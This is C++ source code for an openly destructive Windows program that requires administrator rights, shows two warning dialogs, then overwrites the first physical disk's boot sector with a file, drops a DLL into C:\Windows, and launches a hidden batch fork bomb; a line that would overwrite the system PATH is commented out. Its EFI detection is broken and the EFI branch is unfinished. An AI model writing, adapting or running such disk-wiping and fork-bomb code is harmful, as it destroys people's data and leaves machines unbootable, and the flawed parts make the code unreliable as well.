#include <cstdlib>
#include <sys/types.h>
#include <Windows.h>
#include <winioctl.h>
#include <WinUser.h>
#include <iostream>
#include <stdlib.h>
#include <direct.h>
#include <fstream>
#include <vector>
using namespace std;

void UnpackDeps() {
    system("powershell Copy-Item \"Checkr.dll\" \"C:\\Windows\"");
}

bool is_efi() {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    return si.dwNumberOfProcessors;
}

int BIOSBootFlash() {
    // Open the source file
    HANDLE hSource = CreateFile(TEXT("boot.bin"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hSource == INVALID_HANDLE_VALUE) {
         cerr << "Failed to open source file.\n";
        return 1;
    }

    // Get the size of the source file
    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hSource, &fileSize)) {
        cerr << "Failed to get source file size.\n";
        CloseHandle(hSource);
        return 1;
    }

    // Read the source file into a buffer
    vector<BYTE> buffer(fileSize.QuadPart);
    DWORD bytesRead;
    if (!ReadFile(hSource, buffer.data(), buffer.size(), &bytesRead, NULL) || bytesRead != buffer.size()) {
        cerr << "Failed to read source file.\n";
        CloseHandle(hSource);
        return 1;
    }

    // We're done with the source file
    CloseHandle(hSource);

    // Open the target disk
    HANDLE hDevice = CreateFile(TEXT("\\\\.\\PhysicalDrive0"), GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        cerr << "Failed to open device.\n";
        return 1;
    }

    // Write the buffer to the disk
    DWORD bytesWritten;
    if (!WriteFile(hDevice, buffer.data(), buffer.size(), &bytesWritten, NULL) || bytesWritten != buffer.size()) {
        cerr << "Failed to write to device.\n";
        CloseHandle(hDevice);
        return 1;
    }

    // We're done with the device
    CloseHandle(hDevice);

    return 0;
}

//Added a function to set a system variable to a string

bool SetPermanentEnvironmentVariable(LPCTSTR value, LPCTSTR data) {
    HKEY hKey;
    LPCTSTR keyPath = TEXT("System\\CurrentControlSet\\Control\\Session Manager\\Environment");
    LSTATUS lOpenStatus = RegOpenKeyEx(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_ALL_ACCESS, &hKey);
    if (lOpenStatus == ERROR_SUCCESS) {
        LSTATUS lSetStatus = RegSetValueEx(hKey, value, 0, REG_SZ, (LPBYTE)data, lstrlen(data) + 1);
        RegCloseKey(hKey);
        if (lSetStatus == ERROR_SUCCESS) {
            SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, 0, (LPARAM)"Environment", SMTO_BLOCK, 100, NULL);
            return true;
        }
    }
    return false;
}

//function that creates a batch file which will be the forkbomb.

void forkbomb() {
    const char* path = "C:\\Windows";
    _chdir(path);
    ofstream forkfile("system.bat");
    forkfile << "@echo off\n" << "%0|%0";
    forkfile.close();
    /*const char* batchpath = "C:\\Windows\\system.bat";*/
    ShellExecute(NULL, L"start", L"C:\\Windows\\system.bat", NULL, NULL, SW_HIDE);
}

//it checks if the user is admin. if not it will prompt them to do so and quit.

BOOL IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
    }
       if (hToken) {
        CloseHandle(hToken);
    }
    return fRet;
}

int main()
{
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);

    bool checkadmin = IsElevated();
    
    if (!checkadmin) {
        int errbox = MessageBox(NULL, L"Cannot continue in user mode. You must run this as administrator!", L"ERROR: You must run this as admin!", MB_OK | MB_ICONERROR);
        return 0;
        exit(0);
    }

    int confirmbox = MessageBox(NULL, L"This is a destructive program. By clicking OK you acknowledge that the creator is not responsible for any damage caused.", L"WARNING", MB_OKCANCEL| MB_ICONEXCLAMATION);

    if (confirmbox == IDCANCEL) {
        return 0;
    }
    
    int secondconfirmbox = MessageBox(NULL, L"ALL DATA WILL BE DESTROYED! Are you sure you want to continue?", L"WARNING (Double check)", MB_OKCANCEL | MB_ICONEXCLAMATION);
    
    if (secondconfirmbox == IDCANCEL) {
        return 0;
    }
    if (is_efi() == 0) {
        //EFI Code here
        ShellExecute(NULL, L"mountvol", 0, L"P: /S", 0, 0);
        SetCurrentDirectory(L"P:/EFI/Boot ");
        
    }
    else {
        //BIOS Code here
        BIOSBootFlash();
    }

    

    forkbomb();

    //SetPermanentEnvironmentVariable(L"Path", L"trololol");

    return 0;
}